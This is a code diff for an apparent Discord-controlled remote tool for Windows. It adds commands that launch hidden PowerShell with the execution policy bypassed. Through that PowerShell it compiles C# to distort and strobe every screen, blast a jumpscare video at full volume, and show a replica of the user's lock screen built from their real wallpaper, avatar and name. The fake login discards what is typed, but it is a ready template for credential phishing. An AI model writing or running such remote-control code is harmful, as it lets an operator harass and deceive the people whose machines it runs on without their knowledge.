+                case 19: { double a = t * 0.03; double ca = Math.Cos(a), sn = Math.Sin(a); for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { double dx = x - cx, dy = y - cy; da[y * w + x] = sa[C((int)(cy + dx * sn + dy * ca), h) * w + C((int)(cx + dx * ca - dy * sn), w)]; } break; }
+                case 20: { double z = 1.0 + Math.Sin(t * 0.15) * 0.15; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[C((int)(cy + (y - cy) / z), h) * w + C((int)(cx + (x - cx) / z), w)]; break; }
+                case 21: for (int y = 0; y < h; y++) { int o = (int)((y - cy) * 0.12 * Math.Sin(t * 0.1)); for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + W(x + o, w)]; } break;
+                case 22: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + (x < w / 2 ? w / 2 - x : w - 1 - (x - w / 2))]; break;
+                case 23: { int o = (t * 8) % 40; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int c = sa[y * w + x]; da[y * w + x] = ((x + o) % 40 < 20) ? c : Rgb(((c >> 16) & 255) / 4, ((c >> 8) & 255) / 4, (c & 255) / 4); } break; }
+                case 24: { int o = (t * 6) % 64; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int c = sa[y * w + x]; da[y * w + x] = (((x + o) / 32 + y / 32) % 2 == 0) ? c : Rgb(((c >> 16) & 255) / 3, ((c >> 8) & 255) / 3, (c & 255) / 3); } break; }
+                case 25: for (int y = 1; y < h - 1; y++) for (int x = 1; x < w - 1; x++) { int a = L(sa[y * w + x + 1]), b = L(sa[y * w + x - 1]), c2 = L(sa[(y + 1) * w + x]), d = L(sa[(y - 1) * w + x]); int v = Math.Min(255, Math.Abs(a - b) + Math.Abs(c2 - d)); da[y * w + x] = Rgb(v, v, v); } break;
+                case 26: for (int y = 1; y < h - 1; y++) for (int x = 1; x < w - 1; x++) { int v = L(sa[(y - 1) * w + x - 1]) - L(sa[(y + 1) * w + x + 1]) + 128; da[y * w + x] = Rgb(v, v, v); } break;
+                case 27: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int r = 0, g = 0, b = 0; for (int k = 0; k < 6; k++) { int sx = C((int)(cx + (x - cx) * (1 - k * 0.03)), w), sy = C((int)(cy + (y - cy) * (1 - k * 0.03)), h); int c = sa[sy * w + sx]; r += (c >> 16) & 255; g += (c >> 8) & 255; b += c & 255; } da[y * w + x] = Rgb(r / 6, g / 6, b / 6); } break;
+                case 28: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { double dx = (x - cx) / cx, dy = (y - cy) / cy; double v = 1.0 - Math.Min(1.0, (dx * dx + dy * dy) * 0.55); int c = sa[y * w + x]; da[y * w + x] = Rgb((int)(((c >> 16) & 255) * v), (int)(((c >> 8) & 255) * v), (int)((c & 255) * v)); } break;
+                case 29: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int c = sa[y * w + x]; if (L(c) > 190) { int r = (c >> 16) & 255, g = (c >> 8) & 255, b = c & 255; da[y * w + x] = Rgb(r + 40, g + 40, b + 40); } } break;
+                case 30: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int c = sa[y * w + x]; int v = (int)(Math.Sin(x * 0.03 + t * 0.1) * Math.Cos(y * 0.03 - t * 0.07) * 40); da[y * w + x] = Rgb(((c >> 16) & 255) + v, ((c >> 8) & 255) + v, (c & 255) - v); } break;
+                case 31: for (int y = 0; y < h; y++) { if (rnd.Next(0, 9) == 0) { int o = rnd.Next(-40, 41); for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + W(x + o, w)]; } } break;
+                case 32: for (int k = 0; k < 14; k++) { int bw = rnd.Next(40, 260), bh = rnd.Next(20, 120); int dx2 = rnd.Next(0, Math.Max(1, w - bw)), dy2 = rnd.Next(0, Math.Max(1, h - bh)); int sx = rnd.Next(0, Math.Max(1, w - bw)), sy = rnd.Next(0, Math.Max(1, h - bh)); for (int y = 0; y < bh; y++) Array.Copy(sa, (sy + y) * w + sx, da, (dy2 + y) * w + dx2, bw); } break;
+                case 33: for (int i = 0; i < da.Length; i++) { int c = pa[i]; da[i] = Rgb(((c >> 16) & 255) / 2, ((c >> 8) & 255) / 2, (c & 255) / 2); } for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + x] | da[y * w + x]; break;
+                case 34: for (int i = 0; i < da.Length; i++) { int a = sa[i], b = pa[i]; da[i] = Rgb((((a >> 16) & 255) + ((b >> 16) & 255)) / 2, (((a >> 8) & 255) + ((b >> 8) & 255)) / 2, ((a & 255) + (b & 255)) / 2); } break;
+                case 35: for (int x = 0; x < w; x++) { int o = (int)(Math.Sin(x * 0.02 + t * 0.05) * 40); for (int y = 0; y < h; y++) da[y * w + x] = sa[C(y + o, h) * w + x]; } break;
+                case 36: { int ox = (int)(Math.Sin(t * 0.6) * 12), oy = (int)(Math.Cos(t * 0.4) * 12); for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[C(y + oy, h) * w + C(x + ox, w)]; break; }
+                case 37: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { double dx = (x - cx) / cx, dy = (y - cy) / cy; double r = Math.Sqrt(dx * dx + dy * dy); double k = 1.0 + r * r * 0.45; da[y * w + x] = sa[C((int)(cy + dy * k * cy), h) * w + C((int)(cx + dx * k * cx), w)]; } break;
+                case 38: for (int y = 0; y < h; y++) { int o = (int)(Math.Sin(y * 0.08 + t * 0.2) * 30); for (int x = 0; x < w; x++) { int c = sa[y * w + W(x + o, w)]; da[y * w + x] = ((y / 24) % 2 == 0) ? c : Rgb(((c >> 16) & 255) / 2, ((c >> 8) & 255) / 2, (c & 255) / 2); } } break;
+                default: if (t % 8 < 4) for (int i = 0; i < da.Length; i++) da[i] = sa[i] ^ 0x00FFFFFF; break;
+            }
+            BitmapData dd = dst.LockBits(new Rectangle(0, 0, w, h), ImageLockMode.WriteOnly, PixelFormat.Format32bppPArgb);
+            Marshal.Copy(da, 0, dd.Scan0, da.Length);
+            dst.UnlockBits(dd);
+            using (Graphics g = Graphics.FromHwnd(IntPtr.Zero)) g.DrawImageUnscaled(dst, V.X, V.Y);
+            Array.Copy(da, pa, da.Length);
+            t++;
+            Thread.Sleep(33);
+        }
+        using (Graphics g = Graphics.FromHwnd(IntPtr.Zero)) g.DrawImageUnscaled(src, V.X, V.Y);
+    }
+}
+"""
+
+_GDI_PS1 = os.path.join(tempfile.gettempdir(), "lmfx.ps1")
+
+def _gdi_ps1():
+    try:
+        if os.path.exists(_GDI_PS1) and os.path.getsize(_GDI_PS1) > 6000:
+            return _GDI_PS1
+        with open(_GDI_PS1, "w", encoding="utf-8") as f:
+            f.write("Add-Type -AssemblyName System.Drawing,System.Windows.Forms\n")
+            f.write("$src = @'\n" + _GDI_SRC + "\n'@\n")
+            f.write("Add-Type -TypeDefinition $src -ReferencedAssemblies System.Drawing,System.Windows.Forms\n")
+            f.write("[LmFx]::Run([int]$env:LM_MODE, [int]$env:LM_MS)\n")
+        return _GDI_PS1
+    except Exception:
+        return None
+
+def _gdi(mode, seconds=8):
+    p = _gdi_ps1()
+    if not p:
+        return False
+    subprocess.Popen(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", p],
+                     creationflags=_CNW, stdin=subprocess.DEVNULL,
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                     env=dict(os.environ, LM_MODE=str(mode), LM_MS=str(int(seconds * 1000))))
+    return True
+
+def _gdi_cmd(mode, name, aliases, secs=8):
+    async def _c(ctx, s: int = secs):
+        if _gdi(mode, max(2, min(s, 90))):
+            await ctx.send(embed=create_embed("🖼️ " + name, "The {} effect is now running over every display for {} seconds.".format(name.replace("gdi-", ""), s), 0xb9a8ff))
+        else:
+            await ctx.send(embed=create_embed("🖼️ " + name, "The GDI engine could not be started on this machine.", 0xff4444))
+    _c.__name__ = "gdi_" + re.sub(r"\W", "_", name.lower())
+    bot.command(name=name, aliases=aliases)(_c)
+
+for _m, _n, _a in [
+    (0, "gdi-invert", ["ginv"]), (1, "gdi-gray", ["ggray"]), (2, "gdi-sepia", ["gsepia"]),
+    (3, "gdi-threshold", ["gthr"]), (4, "gdi-posterize", ["gpost"]), (5, "gdi-hue", ["ghue"]),
+    (6, "gdi-rgbsplit", ["gsplit"]), (7, "gdi-chroma", ["gchroma"]), (8, "gdi-crt", ["gcrt"]),
+    (9, "gdi-snow", ["gsnow"]), (10, "gdi-pixelate", ["gpix"]), (11, "gdi-mosaic", ["gmosaic"]),
+    (12, "gdi-rollh", ["grollh"]), (13, "gdi-rollv", ["grollv"]), (14, "gdi-wobble", ["gwobble"]),
+    (15, "gdi-ripple", ["gripple"]), (16, "gdi-swirl", ["gswirl"]), (17, "gdi-kaleido", ["gkaleido"]),
+    (18, "gdi-tunnel", ["gtunnel"]), (19, "gdi-spin", ["gspin"]), (20, "gdi-zoompulse", ["gzoom"]),
+    (21, "gdi-shear", ["gshear"]), (22, "gdi-mirror", ["gmirror"]), (23, "gdi-blinds", ["gblinds"]),
+    (24, "gdi-checker", ["gchecker"]), (25, "gdi-edge", ["gedge"]), (26, "gdi-emboss", ["gemboss"]),
+    (27, "gdi-radialblur", ["gblur"]), (28, "gdi-vignette", ["gvignette"]), (29, "gdi-bloom", ["gbloom"]),
+    (30, "gdi-plasma", ["gplasma"]), (31, "gdi-datamosh", ["gmosham"]), (32, "gdi-glitch", ["gglitch"]),
+    (33, "gdi-echo", ["gecho"]), (34, "gdi-trails", ["gtrails"]), (35, "gdi-melt", ["gmelt"]),
+    (36, "gdi-shake", ["gshake"]), (37, "gdi-fisheye", ["gfish"]), (38, "gdi-stripes", ["gstripes"]),
+    (39, "gdi-strobe", ["gstrobe"]),
+]:
+    _gdi_cmd(_m, _n, _a)
+
+_JS_PS1 = os.path.join(tempfile.gettempdir(), "lmjs.ps1")
+
+_JS_SRC = r"""
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.Media;
+using System.Windows.Forms;
+
+public static class LmJs
+{
+    public static void Run(string img, string snd, int ms)
+    {
+        var forms = new List<Form>();
+        Image pic = Image.FromFile(img);
+        foreach (Screen s in Screen.AllScreens)
+        {
+            var f = new Form();
+            f.FormBorderStyle = FormBorderStyle.None;
+            f.StartPosition = FormStartPosition.Manual;
+            f.Bounds = s.Bounds;
+            f.TopMost = true;
+            f.ShowInTaskbar = false;
+            f.BackColor = Color.Black;
+            var pb = new PictureBox();
+            pb.Dock = DockStyle.Fill;
+            pb.SizeMode = PictureBoxSizeMode.StretchImage;
+            pb.Image = pic;
+            f.Controls.Add(pb);
+            f.Show();
+            forms.Add(f);
+        }
+        try { if (snd != null && snd.Length > 0) { var p = new SoundPlayer(snd); p.Play(); } }
+        catch { }
+        var t = new Timer();
+        t.Interval = ms;
+        t.Tick += delegate { foreach (var f in forms) f.Close(); t.Stop(); Application.ExitThread(); };
+        t.Start();
+        Application.Run();
+        foreach (var f in forms) f.Dispose();
+    }
+}
+"""
+
+def _js_ps1():
+    try:
+        if os.path.exists(_JS_PS1) and os.path.getsize(_JS_PS1) > 1200:
+            return _JS_PS1
+        with open(_JS_PS1, "w", encoding="utf-8") as f:
+            f.write("Add-Type -AssemblyName System.Drawing,System.Windows.Forms\n")
+            f.write("$src = @'\n" + _JS_SRC + "\n'@\n")
+            f.write("Add-Type -TypeDefinition $src -ReferencedAssemblies System.Drawing,System.Windows.Forms\n")
+            f.write("[LmJs]::Run($env:LM_IMG, $env:LM_SND, [int]$env:LM_MS)\n")
+        return _JS_PS1
+    except Exception:
+        return None
+
+JUMPSCARE_URL = "https://github.com/MateAGYT/LessMi/raw/main/resources/jump.mp4"
+JUMP_MIN = 100_000
+
+
+def _jump_ready(path):
+    try:
+        return os.path.exists(path) and os.path.getsize(path) > JUMP_MIN
+    except Exception:
+        return False
+
+
+async def _ensure_jump():
+    for p in (resource_path("jump.mp4"), os.path.join(BASE_DIR, "jump.mp4")):
+        if _jump_ready(p):
+            return p
+    os.makedirs(BASE_DIR, exist_ok=True)
+    dest = os.path.join(BASE_DIR, "jump.mp4")
+    tmp = dest + ".part"
+    async with aiohttp.ClientSession() as s:
+        async with s.get(JUMPSCARE_URL, allow_redirects=True,
+                         timeout=aiohttp.ClientTimeout(total=60)) as r:
+            if r.status != 200:
+                raise OSError(f"HTTP {r.status}")
+            data = await r.read()
+    if len(data) < JUMP_MIN or b"ftyp" not in data[:64]:
+        raise OSError("bad payload (LFS pointer or error HTML)")
+    with builtins.open(tmp, "wb") as f:
+        f.write(data)
+    os.replace(tmp, dest)
+    return dest
+
+
+def _jump_audio(path):
+    wav = os.path.join(BASE_DIR, "jump.wav")
+    try:
+        if os.path.exists(wav) and os.path.getsize(wav) > 4096:
+            return wav
+        subprocess.run(
+            [FFMPEG_BIN, "-y", "-loglevel", "error", "-i", path, "-vn",
+             "-acodec", "pcm_s16le", "-ar", "44100", "-ac", "2", wav],
+            capture_output=True, creationflags=_CNW, timeout=90)
+        if os.path.exists(wav) and os.path.getsize(wav) > 4096:
+            return wav
+    except Exception:
+        pass
+    return None
+
+
+def _play_jump(path):
+    wav = _jump_audio(path)
+    if wav:
+        try:
+            winsound.PlaySound(wav, winsound.SND_FILENAME | winsound.SND_ASYNC)
+        except Exception:
+            pass
+
+    cap = None
+    try:
+        cap = cv2.VideoCapture(path)
+        if not cap.isOpened():
+            raise OSError("no decoder")
+
+        fps = cap.get(cv2.CAP_PROP_FPS)
+        delay = max(1, int(1000.0 / (fps if fps and fps > 1 else 30.0)))
+
+        cv2.namedWindow("jump", cv2.WINDOW_NORMAL)
+        cv2.setWindowProperty("jump", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
+        try:
+            cv2.setWindowProperty("jump", cv2.WND_PROP_TOPMOST, 1)
+            cv2.setWindowProperty("jump", cv2.WND_PROP_ASPECT_RATIO, cv2.WINDOW_KEEPRATIO)
+        except Exception:
+            pass
+
+        first = True
+        while True:
+            ok, frame = cap.read()
+            if not ok:
+                break
+            if first:
+                first = False
+                h, w = frame.shape[:2]
+                cv2.resizeWindow("jump", w, h)
+            cv2.imshow("jump", frame)
+            cv2.waitKey(delay)
+
+        cap.release()
+        cap = None
+        cv2.waitKey(120)
+        cv2.destroyWindow("jump")
+        cv2.waitKey(120)
+        return "cv2"
+    except Exception:
+        return None
+    finally:
+        if cap is not None:
+            try:
+                cap.release()
+            except Exception:
+                pass
+        try:
+            winsound.PlaySound(None, winsound.SND_PURGE)
+        except Exception:
+            pass
+
+@bot.command()
+async def jumpscare(ctx):
+    await ctx.message.add_reaction("👻")
+    try:
+        path = await _ensure_jump()
+    except Exception as e:
+        await ctx.send(embed=create_embed("Error", f"jump.mp4: {e}", 0xFF0000))
+        return
+
+    try:
+        await asyncio.to_thread(set_volume_level, 1.0)
+    except Exception:
+        pass
+
+    used = None
+    for _ in range(2):
+        used = await asyncio.to_thread(_play_jump, path)
+        if used:
+            break
+        await asyncio.sleep(0.3)
+
+    if used:
+        await ctx.send(embed=create_embed("👻 Jumpscare", f"Playing ({used}).", 0xFF0000))
+        return
+
+    try:
+        os.startfile(path)
+        await ctx.send(embed=create_embed("👻 Jumpscare", "Fallback to default player.", 0xFF0000))
+    except Exception as e:
+        await ctx.send(embed=create_embed("Error", f"No player available: {e}", 0xFF0000))
+
+_FL_PS1 = os.path.join(tempfile.gettempdir(), "lmfl.ps1")
+
+_FL_SRC = r"""
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.Drawing.Drawing2D;
+using System.Globalization;
+using System.IO;
+using System.Windows.Forms;
+
+public static class LmFl
+{
+    static List<Form> walls = new List<Form>();
+    static Form main;
+    static TextBox box;
+    static Label hint, spinner, who;
+    static int fails = 0;
+    static Timer spin;
+    static int sf = 0;
+    static string user = Environment.UserName;
+
+    static Image Wall(Screen s)
+    {
+        var bmp = new Bitmap(s.Bounds.Width, s.Bounds.Height);
+        using (var g = Graphics.FromImage(bmp))
+        {
+            g.InterpolationMode = InterpolationMode.HighQualityBicubic;
+            try
+            {
+                string wp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                    @"Microsoft\Windows\Themes\TranscodedWallpaper");
+                if (File.Exists(wp))
+                {
+                    using (var src = Image.FromFile(wp))
+                    {
+                        double r = Math.Max((double)s.Bounds.Width / src.Width, (double)s.Bounds.Height / src.Height);
+                        int w = (int)(src.Width * r), h = (int)(src.Height * r);
+                        g.DrawImage(src, (s.Bounds.Width - w) / 2, (s.Bounds.Height - h) / 2, w, h);
+                    }
+                }
+                else
+                {
+                    g.CopyFromScreen(s.Bounds.X, s.Bounds.Y, 0, 0, s.Bounds.Size);
+                    using (var small = new Bitmap(bmp, Math.Max(1, bmp.Width / 24), Math.Max(1, bmp.Height / 24)))
+                        g.DrawImage(small, 0, 0, bmp.Width, bmp.Height);
+                }
+            }
+            catch { g.Clear(Color.FromArgb(20, 24, 32)); }
+            using (var br = new SolidBrush(Color.FromArgb(96, 0, 0, 0)))
+                g.FillRectangle(br, 0, 0, bmp.Width, bmp.Height);
+        }
+        return bmp;
+    }
+
+    static Image Avatar()
+    {
+        try
+        {
+            string p = @"C:\ProgramData\Microsoft\User Account Pictures\user.png";
+            if (File.Exists(p)) return Image.FromFile(p);
+        }
+        catch { }
+        var bmp = new Bitmap(128, 128);
+        using (var g = Graphics.FromImage(bmp))
+        {
+            g.SmoothingMode = SmoothingMode.AntiAlias;
+            using (var br = new SolidBrush(Color.FromArgb(240, 240, 240))) g.FillEllipse(br, 0, 0, 127, 127);
+            using (var br = new SolidBrush(Color.FromArgb(120, 120, 120)))
+            {
+                g.FillEllipse(br, 44, 24, 40, 40);
+                g.FillPie(br, 24, 70, 80, 90, 180, 180);
+            }
+        }
+        return bmp;
+    }
+
+    public static void Run(int ms)
+    {
+        var scr = Screen.PrimaryScreen;
+        foreach (Screen s in Screen.AllScreens)
+        {
+            if (s.DeviceName == scr.DeviceName) continue;
+            var f = new Form();
+            f.FormBorderStyle = FormBorderStyle.None;
+            f.StartPosition = FormStartPosition.Manual;
+            f.Bounds = s.Bounds;
+            f.TopMost = true;
+            f.ShowInTaskbar = false;
+            var pb = new PictureBox();
+            pb.Dock = DockStyle.Fill;
+            pb.SizeMode = PictureBoxSizeMode.StretchImage;
+            pb.Image = Wall(s);
+            f.Controls.Add(pb);
+            f.Show();
+            walls.Add(f);
+        }
+
+        main = new Form();
+        main.FormBorderStyle = FormBorderStyle.None;
+        main.StartPosition = FormStartPosition.Manual;
+        main.Bounds = scr.Bounds;
+        main.TopMost = true;
+        main.ShowInTaskbar = false;
+        var bg = new PictureBox();
+        bg.Dock = DockStyle.Fill;
+        bg.SizeMode = PictureBoxSizeMode.StretchImage;
+        bg.Image = Wall(scr);
+        main.Controls.Add(bg);
+
+        int cw = scr.Bounds.Width, ch = scr.Bounds.Height;
+
+        var clock = new Label();
+        clock.AutoSize = true;
+        clock.ForeColor = Color.White;
+        clock.BackColor = Color.Transparent;
+        clock.Font = new Font("Segoe UI Light", 54);
+        clock.Text = DateTime.Now.ToString("HH:mm");
+        clock.Location = new Point((cw - 220) / 2, ch / 5);
+        bg.Controls.Add(clock);
+
+        var date = new Label();
+        date.AutoSize = true;
+        date.ForeColor = Color.White;
+        date.BackColor = Color.Transparent;
+        date.Font = new Font("Segoe UI", 16);
+        date.Text = DateTime.Now.ToString("dddd, MMMM d", CultureInfo.InvariantCulture);
+        date.Location = new Point((cw - 300) / 2, ch / 5 + 84);
+        bg.Controls.Add(date);
+
+        var av = new PictureBox();
+        av.Size = new Size(120, 120);
+        av.SizeMode = PictureBoxSizeMode.Zoom;
+        av.BackColor = Color.Transparent;
+        av.Image = Avatar();
+        av.Location = new Point((cw - 120) / 2, ch / 2 - 110);
+        bg.Controls.Add(av);
+
+        who = new Label();
+        who.AutoSize = false;
+        who.TextAlign = ContentAlignment.MiddleCenter;
+        who.Size = new Size(420, 30);
+        who.ForeColor = Color.White;
+        who.BackColor = Color.Transparent;
+        who.Font = new Font("Segoe UI", 20);
+        who.Text = user;
+        who.Location = new Point((cw - 420) / 2, ch / 2 + 18);
+        bg.Controls.Add(who);
+
+        var panel = new Panel();
+        panel.Size = new Size(300, 36);
+        panel.BackColor = Color.FromArgb(230, 255, 255, 255);
+        panel.Location = new Point((cw - 300) / 2, ch / 2 + 60);
+        bg.Controls.Add(panel);
+
+        box = new TextBox();
+        box.BorderStyle = BorderStyle.None;
+        box.Font = new Font("Segoe UI", 12);
+        box.UseSystemPasswordChar = true;
+        box.Size = new Size(250, 22);
+        box.Location = new Point(12, 8);
+        box.BackColor = Color.White;
+        panel.Controls.Add(box);
+
+        var go = new Label();
+        go.Text = "→";
+        go.Font = new Font("Segoe UI", 13);
+        go.AutoSize = false;
+        go.Size = new Size(28, 28);
+        go.TextAlign = ContentAlignment.MiddleCenter;
+        go.BackColor = Color.White;
+        go.Location = new Point(268, 4);
+        panel.Controls.Add(go);
+
+        hint = new Label();
+        hint.AutoSize = false;
+        hint.Size = new Size(460, 40);
+        hint.TextAlign = ContentAlignment.MiddleCenter;
+        hint.ForeColor = Color.White;
+        hint.BackColor = Color.Transparent;
+        hint.Font = new Font("Segoe UI", 11);
+        hint.Text = "PIN or password";
+        hint.Location = new Point((cw - 460) / 2, ch / 2 + 104);
+        bg.Controls.Add(hint);
+
+        spinner = new Label();
+        spinner.AutoSize = false;
+        spinner.Size = new Size(60, 40);
+        spinner.TextAlign = ContentAlignment.MiddleCenter;
+        spinner.ForeColor = Color.White;
+        spinner.BackColor = Color.Transparent;
+        spinner.Font = new Font("Segoe UI", 16);
+        spinner.Visible = false;
+        spinner.Location = new Point((cw - 60) / 2, ch / 2 + 146);
+        bg.Controls.Add(spinner);
+
+        var other = new Label();
+        other.Text = "Other user";
+        other.AutoSize = true;
+        other.ForeColor = Color.White;
+        other.BackColor = Color.Transparent;
+        other.Font = new Font("Segoe UI", 10);
+        other.Location = new Point(40, ch - 60);
+        bg.Controls.Add(other);
+
+        string[] glyphs = { "\uE774", "\uE776", "\uE7E8" };
+        int gx = cw - 130;
+        foreach (string gl in glyphs)
+        {
+            var l = new Label();
+            l.Text = gl;
+            l.Font = new Font("Segoe MDL2 Assets", 15);
+            l.AutoSize = false;
+            l.Size = new Size(30, 30);
+            l.TextAlign = ContentAlignment.MiddleCenter;
+            l.ForeColor = Color.White;
+            l.BackColor = Color.Transparent;
+            l.Location = new Point(gx, ch - 62);
+            bg.Controls.Add(l);
+            gx += 40;
+        }
+
+        spin = new Timer();
+        spin.Interval = 90;
+        string[] frames = { "◐", "◓", "◑", "◒" };
+        spin.Tick += delegate { spinner.Text = frames[sf++ % 4]; };
+
+        EventHandler submit = delegate
+        {
+            box.Clear();
+            box.Visible = false;
+            hint.Text = "Welcome";
+            spinner.Visible = true;
+            sf = 0;
+            spin.Start();
+            var t2 = new Timer();
+            t2.Interval = 2200;
+            t2.Tick += delegate
+            {
+                t2.Stop();
+                spin.Stop();
+                spinner.Visible = false;
+                fails++;
+                if (fails >= 3)
+                {
+                    hint.Text = "The password is incorrect. (Simulation · Esc to exit)";
+                    return;
+                }
+                hint.Text = "The password is incorrect. Try again.";
+                box.Visible = true;
+                box.Focus();
+            };
+            t2.Start();
+        };
+
+        box.KeyDown += delegate (object s, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter) { e.SuppressKeyPress = true; submit(null, null); }
+            if (e.KeyCode == Keys.Escape) Application.ExitThread();
+        };
+        panel.Click += delegate { box.Focus(); };
+        go.Click += submit;
+        main.Click += delegate { box.Focus(); };
+
+        var close = new Timer();
+        close.Interval = Math.Max(2000, ms);
+        close.Tick += delegate { foreach (var w in walls) w.Close(); main.Close(); close.Stop(); Application.ExitThread(); };
+        close.Start();
+
+        main.Show();
+        box.Focus();
+        Application.Run();
+    }
+}
+"""
+
+def _fl_ps1():
+    try:
+        if os.path.exists(_FL_PS1) and os.path.getsize(_FL_PS1) > 3000:
+            return _FL_PS1
+        with open(_FL_PS1, "w", encoding="utf-8") as f:
+            f.write("Add-Type -AssemblyName System.Drawing,System.Windows.Forms\n")
+            f.write("$src = @'\n" + _FL_SRC + "\n'@\n")
+            f.write("Add-Type -TypeDefinition $src -ReferencedAssemblies System.Drawing,System.Windows.Forms\n")
+            f.write("[LmFl]::Run([int]$env:LM_MS)\n")
+        return _FL_PS1
+    except Exception:
+        return None
+
+@bot.command(name="fakelogin", aliases=["login-fake", "lockfake"])
+async def fakelogin(ctx, secs: int = 90):
+    p = _fl_ps1()
+    if not p:
+        return await ctx.send(embed=create_embed("🔐 Fake login", "The helper script could not be written to the disk.", 0xff4444))
+    subprocess.Popen(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", p],
+                     creationflags=_CNW, stdin=subprocess.DEVNULL,
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                     env=dict(os.environ, LM_MS=str(max(10, secs) * 1000)))
+    await ctx.send(embed=create_embed("🔐 Fake login",
+                                      "A replica of the lock screen with the real wallpaper, avatar and user name was opened on every display for **{}** seconds.".format(secs),
+                                      0x00aaff))
+
 if __name__ == "__main__":
     try:
         bot.run(token)
